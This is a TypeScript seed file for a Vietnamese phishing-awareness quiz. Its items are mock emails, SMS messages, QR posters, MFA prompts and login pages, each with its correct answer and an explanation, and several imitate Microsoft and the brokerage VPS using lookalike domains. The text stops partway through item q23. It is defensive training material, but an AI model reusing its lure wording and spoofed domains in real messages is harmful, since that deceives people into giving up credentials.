import type { QuizQuestion } from "./types.js";

// Thời gian mỗi câu của bộ câu hỏi mẫu: random 40/45/50/55/60 giây (câu tạo mới mặc định 30s).
const seedTimeLimits = [40, 45, 50, 55, 60];

const baseSeedQuestions: Array<Omit<QuizQuestion, "timeLimitSeconds">> = [
  {
    id: "q1",
    title: "Thông báo đổi mật khẩu từ bộ phận IT",
    category: "Email",
    scenarioIntro: "Bạn nhận được email tự xưng là từ bộ phận IT.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Tên miền người gửi giả mạo"><strong>From:</strong> IT Support &lt;it-helpdesk@micr0soft-reset.com&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Password Expiring Today</div>
        <p>Dear employee, your password expires in <strong data-spot="danger" data-label="Ngôn ngữ tạo áp lực thời gian">2 hours</strong>.</p>
        <p>Please <a data-spot="danger" data-label="Link đăng nhập không phải Microsoft" href="https://micr0soft-reset.com/login" title="https://micr0soft-reset.com/login">click here to keep access</a> to your Microsoft 365 account.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Email dùng giọng điệu thúc ép, domain giả mạo và dẫn tới trang đăng nhập không thuộc Microsoft.",
    indicators: [
      "Giọng điệu khẩn cấp",
      "Tên miền giả mạo",
      "Liên kết đăng nhập đáng ngờ",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 1,
  },
  {
    id: "q2",
    title: "Tin nhắn về bưu kiện giao không thành công",
    category: "SMS",
    scenarioIntro: "Bạn nhận được tin nhắn báo bưu kiện giao không thành công.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>Courier Notice</strong></p>
        <p data-spot="danger" data-label="Yêu cầu thanh toán phí bất thường">Delivery failed. Confirm your address and pay 2.99 USD:</p>
        <p><a data-spot="danger" data-label="Tên miền giao hàng giả mạo" href="https://courier-track-now.com/pay" title="https://courier-track-now.com/pay">courier-track-now.com/pay</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là kiểu phishing phổ biến qua SMS: tạo cảm giác gấp, thu phí nhỏ và dẫn tới website lookalike để lấy thẻ.",
    indicators: [
      "Phí phát sinh bất thường",
      "Domain lạ",
      "Ép thao tác nhanh",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 2,
  },
  {
    id: "q3",
    title: "Cập nhật chính sách nghỉ phép trên cổng nhân sự",
    category: "Website",
    scenarioIntro: "Cổng thông tin nhân sự thông báo có chính sách nghỉ phép mới.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim">
        <div class="mail-row" data-spot="safe" data-label="Đúng domain nội bộ VPS"><strong>Trang đích:</strong> <a href="https://hrm.vps.com.vn/policy/leave-2026" title="https://hrm.vps.com.vn/policy/leave-2026">https://hrm.vps.com.vn/policy/leave-2026</a></div>
        <p data-spot="safe" data-label="Đúng bối cảnh: chính sách nghỉ phép được thông báo trước cho toàn công ty">Updated Leave Policy 2026</p>
        <button type="button" data-spot="safe" data-label="Chỉ xác nhận đã đọc, không yêu cầu nhập lại mật khẩu hay thông tin cá nhân">Acknowledge policy</button>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Ngữ cảnh phù hợp, domain đúng với hệ thống HR quen thuộc và không yêu cầu thông tin nhạy cảm.",
    indicators: [
      "Đúng bối cảnh",
      "Đúng domain nội bộ VPS",
      "Không yêu cầu nhập mật khẩu",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 3,
  },
  {
    id: "q4",
    title: "Hóa đơn quá hạn cần xác nhận",
    category: "Invoice",
    scenarioIntro: "Bạn nhận được hóa đơn quá hạn từ một nhà cung cấp không quen thuộc.",
    scenarioContent: "Kiểm tra hóa đơn bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="invoice-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc nhà cung cấp quen thuộc"><strong>From:</strong> Billing Team &lt;billing@vendor-payment-alert.net&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Overdue invoice - immediate payment required</div>
        <p>We could not verify your last payment. Open the attached documents today to avoid service interruption.</p>
        <div class="attachment-list">
          <div class="attachment-card" data-spot="danger" data-label="File ZIP từ nguồn lạ có thể chứa mã độc">
            <span class="file-icon file-icon-danger">ZIP</span>
            <div>
              <strong>Invoice_Overdue_2026.zip</strong>
              <span>Compressed archive - 189 KB</span>
            </div>
            <a href="/assets/files/Invoice_Overdue_2026.zip" download>Download</a>
          </div>
          <div class="attachment-card" data-spot="danger" data-label="File Office macro .docm là định dạng rủi ro cao">
            <span class="file-icon file-icon-danger">DOCM</span>
            <div>
              <strong>Payment-Remittance.docm</strong>
              <span>Macro-enabled document - 54 KB</span>
            </div>
            <a href="/assets/files/Payment-Remittance.docm" download>Download</a>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "File nén từ nguồn không rõ ràng là dấu hiệu nguy hiểm, thường được dùng để phát tán malware hoặc tài liệu độc hại.",
    indicators: [
      "Nhà cung cấp không quen",
      "File ZIP đáng ngờ",
      "Dọa gián đoạn dịch vụ",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 4,
  },
  {
    id: "q5",
    title: "Cảnh báo hoạt động bất thường từ ngân hàng",
    category: "Email",
    scenarioIntro: "Một email cho biết tài khoản ngân hàng của bạn có hoạt động bất thường.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="bank-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không thuộc ngân hàng thật"><strong>From:</strong> security@secure-banking-alert.com</div>
        <p>Restore access by entering your account number, PIN and one-time code below.</p>
        <form>
          <input data-spot="danger" data-label="Biểu mẫu lấy thông tin nhạy cảm" disabled value="Account Number" />
          <input data-spot="danger" data-label="Ngân hàng không bao giờ hỏi PIN đủ" disabled value="PIN" />
          <input data-spot="danger" data-label="OTP không được nhập vào form email" disabled value="OTP" />
        </form>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Ngân hàng không yêu cầu nhập đầy đủ PIN hay OTP qua email. Đây là hành vi thu thập thông tin xác thực.",
    indicators: [
      "Yêu cầu dữ liệu nhạy cảm",
      "Biểu mẫu thu thập thông tin",
      "Tạo tâm lý lo sợ",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 5,
  },
  {
    id: "q6",
    title: "Yêu cầu phê duyệt đăng nhập MFA",
    category: "Account Alert",
    scenarioIntro: "Ứng dụng xác thực trên điện thoại liên tục hiện yêu cầu phê duyệt đăng nhập.",
    scenarioContent: "Kiểm tra cảnh báo tài khoản bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mfa-sim mfa-verify-sim">
        <div class="mfa-phone-shell">
          <div class="mfa-phone-status"><span>09:42</span><span>5G 84%</span></div>
          <div class="mfa-verify-popup">
            <div class="mfa-popup-icon">!</div>
            <p class="mfa-app-name">Microsoft Authenticator</p>
            <h4 data-spot="danger" data-label="Yêu cầu phê duyệt đăng nhập xuất hiện bất ngờ, người dùng không chủ động đăng nhập">Approve sign-in?</h4>
            <div class="mfa-request-card">
              <div data-spot="danger" data-label="Vị trí đăng nhập không rõ ràng và không khớp bối cảnh làm việc"><span>Location</span><strong>Bangkok, Thailand</strong></div>
              <div data-spot="danger" data-label="Thiết bị đăng nhập lạ là dấu hiệu cần từ chối yêu cầu MFA"><span>Device</span><strong>Unknown Windows device</strong></div>
              <div data-spot="danger" data-label="Nhiều yêu cầu liên tiếp là dấu hiệu MFA fatigue"><span>Requests</span><strong>5 prompts in 2 minutes</strong></div>
            </div>
            <div class="mfa-number-match" data-spot="danger" data-label="Nếu không chủ động đăng nhập, không được nhập mã hoặc bấm Approve dù popup trông hợp lệ">
              <span>Enter number shown on sign-in screen</span>
              <strong>42</strong>
            </div>
            <div class="mfa-actions">
              <button type="button" class="mfa-deny">Deny</button>
              <button type="button" class="mfa-approve" data-spot="danger" data-label="Bấm Approve có thể cấp quyền truy cập cho kẻ tấn công">Approve</button>
            </div>
          </div>
        </div>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây có thể là MFA fatigue: kẻ tấn công đã có mật khẩu và đang spam thông báo để bạn bấm nhầm chấp nhận.",
    indicators: [
      "Yêu cầu bất ngờ",
      "Lặp lại nhiều lần",
      "Thời điểm bất thường",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 6,
  },
  {
    id: "q7",
    title: "Lịch họp vận hành hằng tuần",
    category: "Email",
    scenarioIntro: "Bạn nhận được lịch họp từ quản lý trực tiếp.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi nội bộ quen thuộc thuộc domain VPS"><strong>From:</strong> manager@vps.com.vn</div>
        <div class="mail-row" data-spot="safe" data-label="Link họp nội bộ đúng hệ thống VPS"><strong>Meeting link:</strong> <a href="https://meet.vps.com.vn/team-weekly" title="https://meet.vps.com.vn/team-weekly">meet.vps.com.vn/team-weekly</a></div>
        <p>Weekly Operations Sync - Tuesday 10:00 AM</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Người gửi, nhịp họp và nền tảng họp đều trùng với hành vi nội bộ bình thường nên đây là trường hợp hợp lệ.",
    indicators: [
      "Người gửi quen thuộc",
      "Đúng lịch họp",
      "Link đúng hệ thống VPS",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 7,
  },
  {
    id: "q8",
    title: "Mã QR tra cứu cập nhật bảng lương",
    category: "QR",
    scenarioIntro: "Bạn thấy tờ thông báo dán ở khu vực máy chấm công, kèm mã QR tra cứu bảng lương.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="danger" data-label="Quét ra payroll-vps-secure.net/login - không thuộc tên miền vps.com.vn và đòi đăng nhập" class="qr-image" src="/assets/qr/qr-01.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="danger" data-label="Chèn từ khóa quen thuộc vào domain lạ để tạo cảm giác tin cậy">Quét để xem điều chỉnh bảng lương</span>
        </div>
        <p class="qr-hint" data-spot="danger" data-label="Yêu cầu đăng nhập ngay sau khi quét">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Mã QR dẫn tới https://payroll-vps-secure.net/login. Tên miền này không thuộc vps.com.vn mà chỉ chèn chữ \"vps\" vào giữa để gây nhầm lẫn, đồng thời yêu cầu đăng nhập để lấy tài khoản.",
    indicators: [
      "Tên miền đích không thuộc vps.com.vn",
      "Chèn từ khóa quen thuộc vào domain lạ để tạo cảm giác tin cậy",
      "Yêu cầu đăng nhập ngay sau khi quét",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 8,
  },
  {
    id: "q9",
    title: "Tài liệu hợp đồng cần rà soát",
    category: "Website",
    scenarioIntro: "Phòng pháp chế gửi yêu cầu đọc một hợp đồng trên nền tảng tài liệu đã được phê duyệt.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim">
        <div class="mail-row" data-spot="safe" data-label="Nền tảng tài liệu nội bộ confluence.vps.com.vn đã được phê duyệt"><strong>Opened via:</strong> <a href="https://confluence.vps.com.vn/legal/contract-2026" title="https://confluence.vps.com.vn/legal/contract-2026">confluence.vps.com.vn/legal/contract-2026</a></div>
        <p data-spot="safe" data-label="Đúng quy trình rà soát hợp đồng đã được thông báo trước trong cuộc họp">Contract Review Required</p>
        <p data-spot="safe" data-label="Không yêu cầu đăng nhập lại, không đính kèm tệp lạ để tải về">Tài liệu mở trực tiếp bằng phiên đăng nhập sẵn có.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Quy trình, hệ thống và thương hiệu đều nhất quán với môi trường làm việc bình thường nên đây là trường hợp hợp lệ.",
    indicators: [
      "Đúng quy trình",
      "Đúng nền tảng",
      "Không có yêu cầu bất thường",
    ],
    active: false,
    alwaysIncluded: false,
    orderIndex: 9,
  },
  {
    id: "q10",
    title: "Yêu cầu chuyển khoản từ lãnh đạo",
    category: "Email",
    scenarioIntro: "Bạn nhận được một email ngắn có vẻ như đến từ CEO.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain giả dạng lãnh đạo VPS"><strong>From:</strong> ceo@vps-executive.com</div>
        <p data-spot="danger" data-label="Yêu cầu chuyển khoản gấp">I need you to process an urgent confidential wire transfer in the next 15 minutes.</p>
        <p data-spot="danger" data-label="Ép giữ bí mật, né quy trình">Do not inform finance until it is done.</p>
        <p><a href="/assets/files/WireTransferForm.html" target="_blank" rel="noreferrer">Open transfer form</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là kiểu lừa đảo BEC điển hình: lợi dụng quyền lực, yêu cầu gấp, giữ bí mật và né quy trình phê duyệt bình thường.",
    indicators: [
      "Gây áp lực từ cấp cao",
      "Yêu cầu giữ bí mật",
      "Đề nghị thanh toán bất thường",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 10,
  },
  {
    id: "q11",
    title: "Trang đăng nhập cần kiểm tra",
    category: "Website",
    scenarioIntro: "Bạn được gửi ảnh chụp màn hình của một trang đăng nhập để kiểm tra độ an toàn.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="image-sim">
        <img data-spot="danger" data-label="Thanh địa chỉ hiển thị domain giả"
          alt="Fake login screenshot"
          src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='800' height='420'><rect width='100%' height='100%' fill='%230f172a'/><rect x='40' y='50' width='720' height='40' rx='12' fill='%23dbeafe'/><text x='60' y='76' font-size='20' fill='%23111827'>https://micros0ft-verify-login.com</text><rect x='220' y='120' width='360' height='220' rx='22' fill='white'/><text x='320' y='165' font-size='28' fill='%23111827'>Microsoft 365</text><rect x='260' y='195' width='280' height='38' rx='10' fill='%23e5e7eb'/><rect x='260' y='245' width='280' height='38' rx='10' fill='%23e5e7eb'/><rect x='260' y='298' width='280' height='34' rx='12' fill='%232563eb'/><text x='375' y='321' font-size='18' fill='white'>Sign in</text></svg>"
        />
        <p data-spot="danger" data-label="Giao diện nhái thương hiệu Microsoft 365 để tạo lòng tin">Trang hiển thị giao diện đăng nhập quen thuộc.</p>
        <p data-spot="danger" data-label="Biểu mẫu thu thập tài khoản và mật khẩu ngay trên trang lạ">Trang yêu cầu nhập tài khoản và mật khẩu để tiếp tục.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Ảnh cho thấy website dùng domain giả mạo có ký tự số thay cho chữ cái. Dù giao diện giống Microsoft, URL không hợp lệ.",
    indicators: [
      "Domain lookalike",
      "Bắt chước thương hiệu",
      "Trang đăng nhập nhái",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 11,
  },
  {
    id: "q12",
    title: "Thông báo gia hạn gói dữ liệu di động",
    category: "SMS",
    scenarioIntro: "Bạn nhận được tin nhắn thông báo gói cước sắp hết hạn.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>Mobile Rewards</strong></p>
        <p data-spot="danger" data-label="Mồi nhử quà tặng miễn phí">Your data plan ends today. Claim free 20GB now:</p>
        <p><a data-spot="danger" data-label="Link không thuộc nhà mạng" href="https://viettel-bonus-gb.top/claim" title="https://viettel-bonus-gb.top/claim">viettel-bonus-gb.top/claim</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Ưu đãi bất thường đi kèm giới hạn thời gian ngắn và domain không phải nhà mạng chính thức là dấu hiệu phishing.",
    indicators: [
      "Khuyến mãi quá tốt",
      "Giới hạn thời gian",
      "Domain không chính thức",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 12,
  },
  {
    id: "q13",
    title: "Mã OTP cho phiên đăng nhập vừa thực hiện",
    category: "SMS",
    scenarioIntro: "Bạn vừa thực hiện đăng nhập vào ứng dụng ngân hàng trên điện thoại.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <p data-spot="safe" data-label="Đúng đầu số ngân hàng bạn đang sử dụng, tin nhắn đến ngay sau thao tác đăng nhập"><strong>VCB</strong></p>
        <p data-spot="safe" data-label="Tin nhắn OTP chuẩn, không có link">OTP dang nhap cua quy khach la 184922. Khong chia se ma nay cho bat ky ai.</p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Tin nhắn đến đúng thời điểm bạn đang đăng nhập, không chứa link, không yêu cầu bấm vào đâu và nội dung phù hợp với OTP thông thường.",
    indicators: [
      "Đúng thời điểm",
      "Không có link",
      "Nội dung OTP chuẩn",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 13,
  },
  {
    id: "q14",
    title: "Mã QR nhận quà tại khu pantry",
    category: "QR",
    scenarioIntro: "Tại khu pantry có poster mời nhân viên quét mã QR để nhận quà.",
    scenarioContent: "Kiểm tra mã QR cùng thông tin đi kèm và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="qr-sim">
        <div class="qr-card">
          <img data-spot="danger" data-label="Quét ra reward-hr-bonus.xyz/login - domain lạ, đuôi .xyz, đòi đăng nhập để nhận quà" class="qr-image" src="/assets/qr/qr-02.png" alt="Mã QR trong tình huống" width="180" height="180" />
          <span data-spot="danger" data-label="Dùng phần thưởng để thúc người quét">Quét để nhận quà tặng nhân viên</span>
        </div>
        <p class="qr-hint" data-spot="danger" data-label="Yêu cầu đăng nhập để nhận quà">Dùng camera điện thoại quét mã để xem đường dẫn thật trước khi quyết định.</p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Mã QR dẫn tới https://reward-hr-bonus.xyz/login. Phần thưởng bất ngờ cộng với tên miền lạ đuôi .xyz và trang đăng nhập là mô típ lừa đảo quen thuộc.",
    indicators: [
      "Tên miền lạ, không phải hệ thống nội bộ",
      "Dùng phần thưởng để thúc người quét",
      "Yêu cầu đăng nhập để nhận quà",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 14,
  },
  {
    id: "q15",
    title: "Cập nhật eKYC cho tài khoản VPS",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo cần cập nhật eKYC cho tài khoản chứng khoán VPS.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi hiển thị đúng domain @vps.com.vn"><strong>From:</strong> VPS Support &lt;support@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Cập nhật eKYC trước 17:00 hôm nay</div>
        <p data-spot="danger" data-label="Nội dung thúc giục thao tác gấp">Tài khoản của Quý khách sẽ bị tạm khóa nếu không cập nhật eKYC trong ngày.</p>
        <p>Vui lòng truy cập: <a data-spot="danger" data-label="Link không thuộc domain chính thức vps.com.vn" href="https://vps-ekyc-secure.com.vn/login" title="https://vps-ekyc-secure.com.vn/login">vps-ekyc-secure.com.vn/login</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Email có thể hiển thị đúng người gửi @vps.com.vn, nhưng vẫn có khả năng email bị lạm dụng, bị chiếm quyền hoặc bị giả mạo phần hiển thị. Trong tình huống này, liên kết dẫn tới domain ngoài không phải vps.com.vn nên đây là dấu hiệu phishing rõ ràng.",
    indicators: [
      "Sender có vẻ hợp lệ nhưng có thể bị lạm dụng",
      "Link ngoài domain",
      "Thúc giục cập nhật gấp",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 15,
  },
  {
    id: "q16",
    title: "Thông báo trạng thái tài khoản VPS qua SMS",
    category: "SMS",
    scenarioIntro: "Bạn nhận được SMS thông báo tài khoản chứng khoán VPS sắp bị khóa.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VPS-Notify</strong></p>
        <p data-spot="danger" data-label="Thông điệp tạo áp lực về việc khóa tài khoản">Tài khoản VPS của Quý khách sẽ bị khóa sau 30 phút do chưa xác minh thông tin.</p>
        <p><a data-spot="danger" data-label="Domain giả mạo gần giống VPS" href="https://vps-com-vn.verify-account.net" title="https://vps-com-vn.verify-account.net">vps-com-vn.verify-account.net</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "SMS dùng áp lực thời gian và domain dài, lạ, chèn chuỗi vps-com-vn để tạo cảm giác giống trang thật.",
    indicators: [
      "Thúc giục trong 30 phút",
      "Domain giả mạo",
      "Yêu cầu xác minh qua link SMS",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 16,
  },
  {
    id: "q17",
    title: "Thông báo xác nhận lệnh rút tiền VPS",
    category: "Email",
    scenarioIntro: "Một email thông báo xác nhận lệnh rút tiền được gửi tới hộp thư của bạn.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Domain người gửi dùng ký tự gần giống, không phải vps.com.vn"><strong>From:</strong> VPS Transaction &lt;no-reply@vps.com-vn.co&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Lệnh rút tiền đang chờ xác nhận</div>
        <p data-spot="danger" data-label="Yêu cầu hủy lệnh nếu không nhận diện được giao dịch">Nếu không phải Quý khách thực hiện, bấm hủy lệnh ngay lập tức.</p>
        <p><a data-spot="danger" data-label="Link dẫn tới domain ngoài hệ thống VPS" href="https://cancel-vps-order.com/secure" title="https://cancel-vps-order.com/secure">Hủy lệnh rút tiền</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Domain người gửi và link đều không phải vps.com.vn. Nội dung đánh vào tâm lý sợ mất tiền để thúc đẩy người dùng bấm link.",
    indicators: [
      "Domain lookalike",
      "Tâm lý sợ mất tiền",
      "Link hủy lệnh giả mạo",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 17,
  },
  {
    id: "q18",
    title: "Lịch bảo trì hệ thống VPS",
    category: "Email",
    scenarioIntro: "Bạn nhận được email thông báo lịch bảo trì hệ thống từ VPS.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain chính thức"><strong>From:</strong> VPS Customer Service &lt;cskh@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Thông báo lịch bảo trì hệ thống</div>
        <p data-spot="safe" data-label="Nội dung chỉ thông báo, không yêu cầu đăng nhập">Hệ thống giao dịch trực tuyến sẽ bảo trì từ 23:00 đến 23:30 ngày hôm nay.</p>
        <p data-spot="safe" data-label="Link đúng domain chính thức vps.com.vn">Chi tiết tại: <a href="https://www.vps.com.vn/thong-bao" title="https://www.vps.com.vn/thong-bao">www.vps.com.vn/thong-bao</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Email đến từ domain chính thức, chỉ thông báo lịch bảo trì và không yêu cầu nhập mật khẩu, OTP hay thông tin nhạy cảm.",
    indicators: [
      "Domain chính thức",
      "Không yêu cầu đăng nhập",
      "Không tạo áp lực thao tác",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 18,
  },
  {
    id: "q19",
    title: "Chương trình cổ phiếu qua SMS",
    category: "SMS",
    scenarioIntro: "Bạn nhận được SMS nói rằng mình được nhận thưởng cổ phiếu miễn phí.",
    scenarioContent: "Kiểm tra xem tin nhắn bạn nhận được có đáng tin hay không?",
    scenarioHtml: `
      <div class="sms-sim">
        <p><strong>VPS Bonus</strong></p>
        <p data-spot="danger" data-label="Mồi nhử quà tặng quá hấp dẫn">Chúc mừng! Quý khách được nhận gói thưởng cổ phiếu trị giá 2.000.000 VND.</p>
        <p data-spot="danger" data-label="Thúc giục nhận thưởng trong thời gian ngắn">Nhận trước 18:00 hôm nay để không mất quyền lợi.</p>
        <p><a data-spot="danger" data-label="Domain không phải VPS chính thức" href="https://vps-stock-gift.top/claim" title="https://vps-stock-gift.top/claim">vps-stock-gift.top/claim</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Đây là kịch bản phishing qua SMS: dùng quà tặng, thời hạn ngắn và domain lạ để dẫn người dùng tới trang giả mạo.",
    indicators: [
      "Quà tặng bất thường",
      "Thời hạn ngắn",
      "Domain .top đáng ngờ",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 19,
  },
  {
    id: "q20",
    title: "Cảnh báo đăng nhập VPS từ thiết bị mới",
    category: "Account Alert",
    scenarioIntro: "Bạn nhận được cảnh báo có đăng nhập VPS từ thiết bị mới.",
    scenarioContent: "Kiểm tra cảnh báo tài khoản bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain @vps.com.vn"><strong>From:</strong> VPS Security &lt;security@vps.com.vn&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Cảnh báo đăng nhập từ thiết bị mới</div>
        <p>Hệ thống ghi nhận đăng nhập từ thiết bị mới vào lúc 09:42.</p>
        <p>Nếu không phải Quý khách, vui lòng xác minh tại <a data-spot="danger" data-label="Text hiển thị là vps.com.vn nhưng hyperlink thật trỏ tới website giả mạo vps-security-check.vn" href="https://vps-security-check.vn/login" title="https://vps-security-check.vn/login">https://www.vps.com.vn/bao-mat/dang-nhap</a></p>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Người gửi có thể hiển thị đúng @vps.com.vn, nhưng email vẫn có thể bị lạm dụng, bị chiếm quyền hoặc bị giả mạo phần hiển thị. Link xác minh không thuộc vps.com.vn nên không nên đăng nhập qua liên kết trong email.",
    indicators: [
      "Sender hợp lệ nhưng có thể bị lạm dụng",
      "Cảnh báo bảo mật tạo lo lắng",
      "Text link và hyperlink thật không khớp",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 20,
  },
  {
    id: "q21",
    title: "Trang đăng nhập VPS trong nhóm chat",
    category: "Website",
    scenarioIntro: "Bạn mở một trang đăng nhập được chia sẻ trong nhóm chat đầu tư.",
    scenarioContent: "Kiểm tra trang web bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="portal-sim">
        <div class="mail-row" data-spot="danger" data-label="Tên miền có thêm dấu gạch và không phải vps.com.vn"><strong>URL:</strong> <a href="https://vps-trading.com.vn/login" title="https://vps-trading.com.vn/login">https://vps-trading.com.vn/login</a></div>
        <p>Đăng nhập tài khoản VPS SmartOne</p>
        <form>
          <input data-spot="danger" data-label="Biểu mẫu đăng nhập trên domain không hợp lệ" disabled value="Số tài khoản / Email" />
          <input data-spot="danger" data-label="Không nhập mật khẩu trên trang không đúng domain" disabled value="Mật khẩu" />
        </form>
      </div>
    `,
    correctAnswer: "phishing",
    explanation: "Trang bắt chước giao diện đăng nhập VPS nhưng domain không phải vps.com.vn. Đăng nhập tại đây có thể làm lộ thông tin tài khoản.",
    indicators: [
      "Domain không hợp lệ",
      "Biểu mẫu đăng nhập giả",
      "Nguồn link từ nhóm chat",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 21,
  },
  {
    id: "q22",
    title: "Lịch hội thảo đầu tư từ VPS",
    category: "Email",
    scenarioIntro: "Bạn nhận được email nhắc lịch hội thảo đầu tư từ VPS.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="safe" data-label="Người gửi đúng domain VPS"><strong>From:</strong> events@vps.com.vn</div>
        <div class="mail-row"><strong>Subject:</strong> Nhắc lịch webinar chiến lược đầu tư</div>
        <p data-spot="safe" data-label="Nội dung phù hợp với email sự kiện, không yêu cầu thông tin nhạy cảm">Webinar sẽ diễn ra lúc 19:30. Quý khách có thể xem thông tin chương trình trên website VPS.</p>
        <p data-spot="safe" data-label="Link đúng domain chính thức">Link chương trình: <a href="https://www.vps.com.vn/su-kien" title="https://www.vps.com.vn/su-kien">www.vps.com.vn/su-kien</a></p>
      </div>
    `,
    correctAnswer: "legitimate",
    explanation: "Email đúng domain, nội dung chỉ nhắc lịch sự kiện và link trỏ về website chính thức. Không có yêu cầu mật khẩu hay OTP.",
    indicators: [
      "Đúng domain",
      "Không yêu cầu đăng nhập",
      "Đúng bối cảnh sự kiện",
    ],
    active: true,
    alwaysIncluded: false,
    orderIndex: 22,
  },
  {
    id: "q23",
    title: "Thông báo tăng hạn mức giao dịch",
    category: "Email",
    scenarioIntro: "Một email thông báo bạn được tăng hạn mức giao dịch trong ngày.",
    scenarioContent: "Kiểm tra email bên dưới và đưa ra quyết định của bạn.",
    scenarioHtml: `
      <div class="mail-sim">
        <div class="mail-row" data-spot="danger" data-label="Người gửi không đúng domain chính thức"><strong>From:</strong> VPS Margin &lt;margin@vps-vn.net&gt;</div>
        <div class="mail-row"><strong>Subject:</strong> Tăng hạn mức margin trong 2 giờ</div>
